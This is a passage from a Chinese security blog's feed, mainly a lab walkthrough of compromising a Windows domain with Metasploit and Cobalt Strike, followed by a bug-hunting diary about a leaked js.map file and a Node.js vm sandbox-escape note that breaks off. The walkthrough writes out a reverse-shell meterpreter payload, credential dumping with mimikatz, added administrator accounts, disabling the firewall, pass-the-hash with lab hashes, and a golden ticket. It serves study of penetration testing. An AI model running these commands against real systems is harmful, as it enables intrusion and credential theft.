class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter_reverse_tcp LHOST=192.168.191.128 LPORT=1234 -f exe -o shell.exe</span><br></pre></td></tr></table></figure><ul><li>开启监听</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter_reverse_tcp</span><br><span class="line">set lhost 192.168.191.128</span><br><span class="line">set lport 1234</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure><ul><li><p>用蚁剑将exe上传并执行<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/47.jpg" alt="1"><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/46.jpg" alt="1"></p></li><li><p>得到反弹的msf shell</p></li></ul><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/45.jpg" alt="1"><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/44.jpg" alt="1"></p><ul><li><p>进入反弹回来的会话中, 查看当前权限<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/43.jpg" alt="1"></p></li><li><p>发现已经是system权限了,不需要提权, 接下来获取密码</p></li></ul><h4 id="密码攻击"><a href="#密码攻击" class="headerlink" title="密码攻击"></a>密码攻击</h4><ul><li>利用hashdump抓取密码</li></ul><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/42.jpg" alt="1"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Windows系统下的hash密码格式为：</span><br><span class="line">用户名称:RID:LM-HASH值:NT-HASH值</span><br><span class="line">NT-HASH hash生产方式：</span><br><span class="line"></span><br><span class="line"> 1. 将明文口令转换成十六进制的格式 </span><br><span class="line"> 2. 转换成Unicode格式，即在每个字节之后添加0x00</span><br><span class="line"> 3. 对Unicode字符串作MD4加密，生成32位的十六进制数字串</span><br><span class="line"></span><br><span class="line">eg：用户密码为test123</span><br><span class="line">转换成十六进制的格式为74657374313233</span><br><span class="line">转换成Unicode格式为7400650073007400310032003300</span><br><span class="line">对字符串7400650073007400310032003300作MD4加密，结果为c5a237b7e9d8e708d8436b6148a25fa1</span><br></pre></td></tr></table></figure><ul><li>加载 mimikatz 模块，加载模块前需要先将meterpreter迁移到64位的进程，该进程也需要是system权限<ul><li>查看进程 <code>ps</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/41.jpg" alt="1"></li><li>把进程迁移到PID为520这个程序中(找一个x64的程序移进去就好) <code>migrate [PID]</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/40.jpg" alt="1"></li><li>加载kiwi模块 <code>load kiwi</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/39.jpg" alt="1"></li><li>执行命令抓取密码 <code>kiwi_cmd sekurlsa::logonpasswords</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/38.jpg" alt="1"></li><li>也可以列举系统中的明文密码 <code>creds_all</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/37.jpg" alt="1"></li></ul></li></ul><h4 id="远程桌面"><a href="#远程桌面" class="headerlink" title="远程桌面"></a>远程桌面</h4><ul><li><p>最后, 可以开启远程窗口服务, 完成此机器的渗透, 可以先执行命令 <code>screenshot</code> 尝试截取目标靶机的屏幕测试一下</p></li><li><p>开启3389服务 <code>run post/windows/manage/enable_rdp</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/36.jpg" alt="1"></p></li><li><p>测试一下 <code>nmap -p 3389 192.168.191.128</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/35.jpg" alt="1"></p></li><li><p>进行连接</p><ul><li>进入shell <code>shell</code>, 创建用户并设置密码<br>进入windows shell后乱码可以执行 <code>chcp 65001</code> 命令恢复</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user Hades ytm@123 /add   #密码最好不要太简单也不要含有用户名</span><br></pre></td></tr></table></figure><ul><li>将用户提升到管理员权限</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators Hades /add</span><br></pre></td></tr></table></figure><ul><li>最后再查看一下</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure><ul><li>在Kali上使用创建的账户远程登录被攻击的主机</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop -u Hades 192.168.191.138</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/34.jpg" alt="1"></p></li></ul><h4 id="msf横向移动"><a href="#msf横向移动" class="headerlink" title="msf横向移动"></a>msf横向移动</h4><p>横向渗透前，先将该web服务器配置为代理服务器当作跳板机</p><p><strong>隧道搭建</strong>:</p><ul><li><p>msf+proxychains</p><ul><li><p>可用msf直接搭建sock隧道, 进入session, 自动创建路由 <code>run post/multi/manage/autoroute</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/32.jpg" alt="1"></p></li><li><p>查看路由 <code>run autoroute -p</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/27.jpg" alt="1"></p></li><li><p>退到上层，使用socks5进行代理</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">background</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/31.jpg" alt="1"></p><ul><li><p>run后 可用<code>jobs</code>查看任务是否执行<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/30.jpg" alt="1"></p></li><li><p>配置proxychains <code>vi /etc/proxychains.conf</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/29.jpg" alt="1"></p></li><li><p>全局代理测试 <code>proxychains curl 192.168.52.143/phpmyadmin</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/28.jpg" alt="1"></p></li></ul></li></ul><hr><p>那么至此, 成功构成利用msf构成socks5反向代理的隧道, 接下来进行内网的信息收集</p><ul><li>主机探活的一些模块</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">post/windows/gather/arp_scanner          #基于arp协议发现内网存活主机</span><br><span class="line">auxiliary/scanner/discovery/udp_sweep    #基于udp协议发现内网存活主机</span><br><span class="line">auxiliary/scanner/discovery/udp_probe    #基于udp协议发现内网存活主机</span><br><span class="line">auxiliary/scanner/netbios/nbname         #基于netbios协议发现内网存活主机</span><br></pre></td></tr></table></figure><p>这里挑一个演示一下(arp_scanner):</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use post/windows/gather/arp_scanner</span><br><span class="line"></span><br><span class="line">set RHOSTS 192.168.52.0/24</span><br><span class="line"></span><br><span class="line">set SESSION 1</span><br><span class="line"></span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/Z4yrMs3iw8QSmRn.png" alt="1"></p><p>探活结果:</p><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/26.jpg" alt="1"></p><p>结合发现内网内共存在三台主机</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">192.168.52.138/24</span><br><span class="line"></span><br><span class="line">192.168.52.141/24</span><br><span class="line"></span><br><span class="line">192.168.52.143/24</span><br></pre></td></tr></table></figure><ul><li>内网主机服务探测</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/ftp_version            #发现内网ftp服务，基于默认21端口</span><br><span class="line">auxiliary/scanner/ssh/ssh_version            #发现内网ssh服务，基于默认22端口</span><br><span class="line">auxiliary/scanner/telnet/telnet_version      #发现内网telnet服务，基于默认23端口</span><br><span class="line">auxiliary/scanner/dns/dns_amp                #发现dns服务，基于默认53端口</span><br><span class="line">auxiliary/scanner/http/http_version          #发现内网http服务，基于默认80端口</span><br><span class="line">auxiliary/scanner/http/title                 #探测内网http服务的标题</span><br><span class="line">auxiliary/scanner/smb/smb_version            #发现内网smb服务，基于默认的445端口   </span><br><span class="line">auxiliary/scanner/mssql/mssql_schemadump     #发现内网SQLServer服务,基于默认的1433端口</span><br><span class="line">auxiliary/scanner/oracle/oracle_hashdump     #发现内网oracle服务,基于默认的1521端口 </span><br><span class="line">auxiliary/scanner/mysql/mysql_version        #发现内网mysql服务，基于默认3306端口</span><br><span class="line">auxiliary/scanner/rdp/rdp_scanner            #发现内网RDP服务，基于默认3389端口</span><br><span class="line">auxiliary/scanner/redis/redis_server         #发现内网Redis服务，基于默认6379端口</span><br><span class="line">auxiliary/scanner/db2/db2_version            #探测内网的db2服务，基于默认的50000端口</span><br><span class="line">auxiliary/scanner/netbios/nbname             #探测内网主机的netbios名字</span><br></pre></td></tr></table></figure><ul><li><p>查看域信息<br><code>net view</code></p></li><li><p>查看主域信息<br><code>net view /domain</code></p></li><li><p>内网主机端口扫描</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -Pn -sT 192.168.52.141</span><br><span class="line"></span><br><span class="line">proxychains nmap -sS -sV -Pn 192.168.52.141</span><br><span class="line"></span><br><span class="line">auxiliary/scanner/portscan/tcp           #基于tcp进行端口扫描(默认扫描1-10000)</span><br></pre></td></tr></table></figure><p>这里使用msf的模块扫描:<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/26.jpg" alt="1"></p><hr><p><strong>漏洞利用</strong>:</p><p>刚才根据扫描, 发现开放了445端口, 可以用MS17_010（永恒之蓝）攻击试一下 <code>auxiliary/scanner/smb/smb_ms17_010</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/23.jpg" alt="1"></p><p>经过测试, 通过msf正向连接shell成功率不高, 其中的 <code>auxiliary/admin/smb/ms17_010_command</code> 模块可以正常使用, 尝试执行命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/ms17_010_command</span><br><span class="line"></span><br><span class="line">set COMMAND net user</span><br><span class="line"></span><br><span class="line">set RHOST 192.168.52.141</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/22.jpg" alt="1"></p><p>可以成功执行命令, 之后尝试过之前提到过的连接远程桌面, 但在这里没成功<br>但是可以试着打开telnet服务, 通过telnet远程连接</p><ul><li>先添加一个用户并提升权限</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set COMMAND net user hack Hades /add</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">set COMMAND net user hack ytm@123</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">set COMMAND net localgroup administrators Hades /add</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><ul><li>打开telnet服务</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set COMMAND sc config tlntsvr start= auto</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">set COMMAND net start telnet</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">set COMMAND netstat -an    #查看一下23端口号是否成功开启</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/9jeiGhSNboMRt7I.png" alt="1"></p><ul><li>telnet连接</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/telnet/telnet_login</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">telnet 192.168.52.141  #在这一步输入刚创建的账号密码</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/21.jpg" alt="1"></p><p>至此, 这台服务器也成功拿下( <code>ctrl+]</code> 再输入q退出telnet)</p><hr><p>其他一些思路: <a href="https://bwshen.blog.csdn.net/article/details/118338328">https://bwshen.blog.csdn.net/article/details/118338328</a></p><p>接下来, 我们用其他思路横向2008这台域控</p><ul><li>psexec攻击(哈希传递): 通过之前密码攻击拿到的域管理员账号后，可以使用该域管理员账号密码利用 psexec 登录域内任何一台开启了admin$共享(该共享默认开启) 的主机。</li></ul><p>可以在win7的远程桌面上下载此工具(或者通过蚁剑上传): <a href="https://download.sysinternals.com/files/PSTools.zip">https://download.sysinternals.com/files/PSTools.zip</a></p><p>然后执行程序, 拿到域控的shell <code>psexec.exe \\192.168.52.138 -u god\administrator -p hongrisec@2019 cmd</code></p><ul><li>获取到域管理员密码NTLM hash值时，可借助mimikatz进行进行登录域内其他电脑：<code>sekurlsa::pth /user:administrator /domain:&quot;god.org&quot; /ntlm:c456c606a647ef44b646c44a227917a4 </code></li></ul><p>还有很多方法, 目前就到这里吧, 接下来用cs演示一下渗透过程</p><h3 id="cs渗透"><a href="#cs渗透" class="headerlink" title="cs渗透"></a>cs渗透</h3><ul><li><p>开启cs服务 <code>./teamserver &lt;IP&gt; &lt;password&gt;</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/19.jpg" alt="1"></p></li><li><p>创建监听器, 设置好监听端口, 开始监听<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/18.jpg" alt="1"></p></li><li><p>接下来可以通过cs中的 <code>攻击—&gt;生成后门—&gt;Windows可执行文件</code> 生成cs马, 以同样的方式在蚁剑shell中执行实现上线cs<br>我这里使用msf和cs联动的方式将shell派发给cs:</p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use windows/local/payload_inject</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set DisablePayloadHandler true #payload_inject执行之后会在本地产生一个新的handler，设置为true表示不重复生成</span><br><span class="line">set lhost 192.168.191.128      #公网vps ip</span><br><span class="line">set lport 5555                 #监听端口 </span><br><span class="line">set session 1                  #派发session id</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/17.jpg" alt="1"><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/16.jpg" alt="1"></p><ul><li><p>回连间隔改为0（这只是靶场操作，实战不要用容易被ban）<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/15.jpg" alt="1"></p></li><li><p>顺手先关个防火墙 <code>shell netsh advfirewall set allprofiles state off</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/14.jpg" alt="1"></p></li><li><p>目前权限也是最高, 可以不用进行提权操作了, 这里因为是第二次渗透, 内网信息收集就不做过多演示了</p></li><li><p>端口扫描 <code>浏览探测—&gt;端口扫描—&gt;52内网段</code></p></li></ul><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/12.jpg" alt="1"><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/11.jpg" alt="1"></p><ul><li>抓取明文密码等下横向会用到 <code>凭证提权—&gt;抓取明文密码</code><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/10.jpg" alt="1"></li></ul><h4 id="cs横向移动"><a href="#cs横向移动" class="headerlink" title="cs横向移动"></a>cs横向移动</h4><p>刚刚我们端口扫描的时候发现开放了445端口，可以创建SMB监听隧道</p><ul><li><p>创建SMB监听器<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/9.jpg" alt="1"></p></li><li><p>切换攻击目标列表<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/8.jpg" alt="1"></p></li><li><p>右建选择—&gt; 横向移动 —&gt; psexec<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/7.jpg" alt="1"><br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/6.jpg" alt="1"></p></li><li><p>横向成功，进入域控<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/5.jpg" alt="1"></p></li><li><p>按同样方式也可以拿下另一台域成员服务器<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/4.jpg" alt="1"></p></li></ul><hr><p><strong>权限持久化</strong>(黄金票据):<br>黄金票据是指能够绕过认证授权（Authentication and Authorization）机制并获得所需权限的票据。这种票据可以被攻击者收集和利用，从而从系统内部获取高权限，甚至完全控制系统。</p><ul><li>把SID，域名，复制下来等下黄金票据要用</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hash: 58e91a5ac358d86513ab224312314061</span><br><span class="line"></span><br><span class="line">SID: S-1-5-21-2952760202-1353902439-2381784089-1000</span><br><span class="line"></span><br><span class="line">域名：GOD.ORG</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/3.jpg" alt="1"></p><ul><li><p>把刚刚复制的域名，SID粘贴上去，hash自动抓取了，用户名随意<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/2.jpg" alt="1"></p></li><li><p>成功获取<br><img src="https://raw.githubusercontent.com/Hades-blog/photo/master/img/1.jpg" alt="1"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 靶场 </category>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免杀-golang免杀实现</title>
      <link href="/2024/06/04/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-golang%E5%85%8D%E6%9D%80%E5%AE%9E%E7%8E%B0/"/>
      <url>/2024/06/04/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-golang%E5%85%8D%E6%9D%80%E5%AE%9E%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>挖洞日记1--一次有意思的信息泄露</title>
      <link href="/2024/03/27/%E5%91%A8%E8%AE%B0-2024-03-28-%E6%8C%96%E6%B4%9E%E6%97%A5%E8%AE%B01/"/>
      <url>/2024/03/27/%E5%91%A8%E8%AE%B0-2024-03-28-%E6%8C%96%E6%B4%9E%E6%97%A5%E8%AE%B01/</url>
      
        <content type="html"><![CDATA[<p>开始挖洞也有好几天了,虽说没啥成绩,但是也学到了一些东西,感悟到了不少<br>挖洞过程中遇到了个有意思的利用过程,借此来聊一下</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>起初是因为喜欢偏向实战一些,早些天就开始学习起了挖洞,小目标想挖本cnvd证书<br>我知道它很难挖,但是没想到这么折磨,虽然挖的时间并不长,却也切身感受到面对庞大互联网资产时无从下手的痛苦</p><p>最开始我按着主流观点挖掘通用型漏洞多些,尝试着挖通杀洞,而目前cnvd只收资产大于5000万的企业的10起以上案例的漏洞才会给证书</p><p>所以有一说一是真的难挖,挖了几天感觉毫无头绪,直接run去碰碰运气事件型有没有搞头(三大运营商或政府机关等平台的中高危漏洞)<br>你别说,单一顺着一个企业挖思路确实清晰一些,也是在中国联通的某平台挖到个有意思的漏洞</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>既然是挖事件型,先试着从三大运营商入手,随便找一个然后正常的做信息收集</p><p>挖到的目标是中国联通的某智慧城市平台</p><p><img src="https://s2.loli.net/2024/03/29/5oMkCHTn3erLtRp.png" alt="image.png"></p><p>发现是类似于一个小的监控平台,像是一个未授权访问,不过重点不是这个</p><p>放到扫描器进行扫描目录和api等,发现一个js.map的文件泄露,而对于我来说,也是第一次遇见这样的文件,通过搜索得知</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">js.map 文件是 JavaScript Source Map 文件的一种，通常用于在调试 JavaScript 代码时进行源代码映射。这种文件包含了源代码和编译后的代码之间的映射关系，可以帮助开发人员在浏览器中调试压缩过的 JavaScript 代码时定位到源代码中的位置。</span><br><span class="line">Source Map 文件包含了编译后的代码与源代码的对应关系，以及行号、列号等信息，这样在浏览器的开发者工具中就能够将错误或者日志信息准确地映射回源代码，方便开发人员进行调试和定位问题。</span><br></pre></td></tr></table></figure><p>也就是说,此文件是有可能造成js文件的源码泄露,而如果网站服务端刚好是用纯js写的(如node.js),那么就造成了严重的网站源码泄露</p><hr><p>刚好,此平台是纯js架构,利用扫描出的未授权接口,下载出该平台的map文件,发现是类似编译后的构成</p><p><img src="https://s2.loli.net/2024/03/29/Mc5hCWlFZ16mLkn.png" alt="image.png"></p><p>通过搜索发现如下的利用方式：</p><p>可以利用reverse-sourcemap工具反编译js.map文件</p><ol><li><p>全局安装此工具:npm install –global reverse-sourcemap</p></li><li><p>反编译泄露文件至aaa文件夹reverse-sourcemap -o aaa -v xxx.js.map</p></li></ol><p><img src="https://s2.loli.net/2024/03/29/uN7n2T3AGPxpKX6.png" alt="image.png"></p><p>运行后成功拿到网站源码,后续可以进行代码审计进一步扩大危害,目前已提交至cnvd等待进一步审核</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>说实话,这个洞早在一周前就挖到了,提交过程也是艰难坎坷,审核一直不给过说是缺少平台归属证明,这几天一直收集证据写文档了,真的磨人性子,纯折磨王,可能这个洞最后也就不了了之了,但是这个过程总是要经历的,接下来还是老老实实继续挖通用型吧</p><p>对于这些时间的漏洞挖掘,体会最大的就是耐心是多么的重要,找洞两小时,利用两分钟,起码常见的漏洞利用过程真的不难,但是耐心做好信息收集然后一个一个测试才是真的折磨<br>但是确实还是能挖到东西的,就像我如此浮躁的人也莫名的找到过两次上亿资产的企业后台用的若依这种如此高危的框架,甚至默认密码直接进后台,之后就是两三个中高危,当时就觉得这种公司的安全意识也这么低吗…只可惜当时也不知道怎么想的,交不了cnvd我也懒得去交公益src了,不过也确实没啥卵用哈哈</p><p>最后闲聊几句,其实感觉这个信息泄露挺有意思的,毕竟也是第一次见,居然没见CTF有人出过(可能是我做的题太少了哈哈),然后希望自己能坚持下去这条路吧,最近的状态实在太低迷了</p>]]></content>
      
      
      <categories>
          
          <category> 周记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 周记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-VM沙箱逃逸</title>
      <link href="/2024/03/23/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/03/23/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<p>详解: <a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD/QbiQQdO70ttD=Y4D&amp;alichlgref=https://cn.bing.com/">https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQdO70ttD%3DY4D&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F</a></p><p>vm逃逸最重要的就是一个作用域的问题，如何逃离vm创建的作用域，逃离到global去，然后获取到process对象，进而用process去引用require命令执行</p><h2 id="1-一些vm模块用法"><a href="#1-一些vm模块用法" class="headerlink" title="1.一些vm模块用法"></a>1.一些vm模块用法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sandbox = &#123;</span><br><span class="line"><span class="attr">animal</span>: <span class="string">&#x27;cat&#x27;</span>,</span><br><span class="line"><span class="attr">count</span>: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(<span class="string">&#x27;count += 1; name = &quot;kitty&quot;;&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox));</span><br><span class="line"><span class="comment">// &#123; animal: &#x27;cat&#x27;, count: 3, name: &#x27;kitty&#x27; &#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> util = <span class="built_in">require</span>(<span class="string">&#x27;util&#x27;</span>);</span><br><span class="line">  <span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line">  <span class="variable language_">global</span>.<span class="property">globalVar</span> = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">const</span> sandbox = &#123; <span class="attr">globalVar</span>: <span class="number">1</span> &#125;;</span><br><span class="line">  vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line">  vm.<span class="title function_">runInContext</span>(<span class="string">&#x27;globalVar *= 2;&#x27;</span>, sandbox);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(sandbox)); <span class="comment">// &#123; globalVar: 2 &#125;</span></span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(util.<span class="title function_">inspect</span>(globalVar)); <span class="comment">// 3</span></span><br></pre></td></tr></table></figure><h2 id="2-VM逃逸"><a href="#2-VM逃逸" class="headerlink" title="2.VM逃逸"></a>2.VM逃逸</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&quot;use strict&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&quot;vm&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> y1 = vm.<span class="title function_">runInNewContext</span>(<span class="string">`this.constructor.constructor(&#x27;return process.env&#x27;)()`</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(y1);</span><br></pre></td></tr></table></figure><p>这样就可以得到process，注意代码的<code>this.constructor.constructor</code></p><p>首先这里面的this指向的是当前传递给runInNewContext的对象，这个对象是不属于沙箱环境的。第一个constructor得到的是这个this对象的构造器，第二个constructor得到的是构造器对象的构造器，也就是Function的Constructor，最后的()是调用这个用Function的constructor生成的函数，最终返回了一个process对象</p><p>然后就可以rce了:</p><figure class="highlight 